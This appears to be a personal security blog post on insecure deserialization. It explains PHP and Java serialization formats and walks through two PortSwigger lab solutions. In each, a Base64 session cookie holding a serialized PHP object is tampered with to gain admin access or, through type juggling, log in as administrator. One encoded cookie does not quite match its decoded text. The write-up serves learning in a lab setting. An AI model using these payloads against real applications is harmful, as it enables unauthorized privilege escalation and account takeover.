---
layout: post
title: Insecure deserialization
subtitle: Insert serialized malicious command, and it triggers when the application deserialization.
date: 2025-07-30 09:59
author: Ren Sie
comments: true
category: injection
---

The attack can lead to RCE, privilege escalation, arbitrary file access, and denial-of-service attacks.

### Serialization
Turns the complex data objects into a stream of data. Which make it easier to store or transfer.

#### PHP
- Letters = data type.
- Numbers = length of each entry.
- Serialize method: serialize() and unserialize()
If you have source code access, start by looking for unserialize() and investigating further. 
~~~
O:4:"User":2:{s:4:"name":s:6:"carlos";s:10:"isLoggedIn":b:1;} 
~~~
This can be interpreted as follows:
> O:4:"User" - Object w/ 4-character class name "User"  
> 2 - Object has 2 attributes  
> s:4:"name" - The key of the first attribute is the 4-character string "name"  
> s:6:"carlos" - The value of the first attribute is the 6-character string "carlos"  
> s:10:"isLoggedIn" - The key of the second attribute is the 10-character string "isLoggedIn"  
> b:1 - The value of the second attribute is the boolean value true

#### Java
Serialized Java objects always begin with the same bytes which are encoded:
- Hexadecimal: ac ed
- Base64: rO0
- Method: java.io.Serializable
If you have source code access, take note of any code that uses the readObject() method, which is used to read and deserialize data from an InputStream.  

### Deserialization
Reverse the process of Serialization, turn data stream back to data objects.  
If a website deserializes data that comes from the user, it can be dangerous. because the attacker can change the serialized data.

#### Manipulating serialized objects
1. Look at the serialized data.
2. Find important values (e.g., user roles or permissions).
3. Edit those values.
4. Send the modified object back to the website.
5. The website deserializes the object.
6. The website uses your edited values.

### Labs
Just for demostration, I completed a couple of labs on [PortSwigger Academy](https://portswigger.net/web-security/all-labs#insecure-deserialization) to show what this vulnerability can lead to:

#### 1. Modifying serialized objects 
In this instance, I will try editing the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges.  
<details markdown="1">
  <summary>Click me to expand the process</summary>  
1. Firstly, I capture and analyze the session cookie from the response of the `GET /my-account request` using Burp Proxy. Then decode the session cookie from Base64 to reveal the serialized data: 
~~~
Session Cookie: Tzo0OiJVc2VyljoyOntzOjg6lnVzZXJuYW1lljtzOjY6lndpZW5lcil7czo1OiJhZG1pbil7YjowO30
Decoding Result: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
~~~

2. I notice there's admin parameter, I modify the serialized object by changing `'admin;b:0'` to `'admin;b:1'`, granting admin privileges.  
After that, re-encode the modified serialized data back into Base64 and use it as the new session cookie. 
~~~
Serialized Object: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;} 
Encoding Result: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30g
~~~

3. Send another `GET /my-account request` to the web application using Burp Repeater with the modified session cookie.  
Once that's done I see a `GET /admin request` is captured in Burp Proxy, but initially returns 401 Unauthorized.  

4. I resend the `GET /admin request` with the modified session cookie by Burp Repeater. This time, it returns 200 OK, confirming admin access.
</details>

#### 2. Modifying serialized data types
In this instance, I edit the serialized object in the session cookie to access the administrator account. Then, delete the user carlos.  
<details markdown="1">
  <summary>Click me to expand the process</summary>  
1. Firstly, I capture and analyze the session cookie from the response of the `GET /my-account request` using Burp Proxy. Then decode the session cookie from Base64 to reveal the serialized data: 
~~~
Session Cookie: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJqeGoxb2NpcHZreTFpZzE0bzF1ajV0Nmt5bHlpYnoweiI7
Decoding Result: O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"jxj1ocipvky1ig14o1uj5t6kylyibz0z";
~~~

2. Then I modify the serialized data type by changing:  
   - "username";s:6:"wiener" > "username";s:13:"administrator"
   - "access_token";s:32:"jxj1oc..." > "access_token";i:0;

3. Re-encode the modified serialized data back into Base64 and use it as the new session cookie.
~~~
Serialized Object: O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
Encoding Result: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
~~~

4. I decide to use different approach from the previous instance. Instead of using Burp Repeater, I insert the encoded modified cookie session from the developer tool. 
   - Right click on the page > Inspect > Application > Cookies > Paste the cookie into "Value"
   - Value: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
 
5. Once that's done, refresh the page, and we will access the admin account. I then navigate to admin panel and delete user "carlos" account.
</details>
